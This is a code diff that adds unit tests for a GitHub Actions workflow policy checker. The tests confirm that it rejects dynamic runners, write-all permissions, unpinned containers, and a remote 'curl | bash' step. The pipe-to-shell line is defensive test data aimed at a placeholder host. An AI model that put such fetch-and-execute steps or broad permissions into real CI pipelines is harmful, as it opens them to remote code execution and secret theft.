@@ -40,6 +40,22 @@ class WorkflowPolicyTests(unittest.TestCase):
         self.assertIn("token write permission", issues)
         self.assertIn("secret expression", issues)
 
+    def test_block_dynamic_or_secondary_runner(self):
+        multi = SAFE + "  another-job:\n    runs-on: vars.RUNNER\n"
+        self.assertIn("every job must use literal GitHub-hosted ubuntu-latest",
+                      gate.check(multi))
+
+    def test_block_write_all_and_unpinned_container(self):
+        altered = SAFE.replace("contents: read", "permissions: write-all")
+        altered += "      - uses: docker://sample:latest\n"
+        issues = gate.check(altered)
+        self.assertIn("write-all permission is forbidden", issues)
+        self.assertIn("remote actions must use 40-character commit pins", issues)
+
+    def test_block_remote_shell_pipeline(self):
+        issues = gate.check(SAFE + "      - run: curl example.invalid | bash\n")
+        self.assertIn("remote shell pipelining is forbidden", issues)
+
     def test_block_mutable_action(self):
         issues = gate.check(SAFE.replace(
             "actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683",
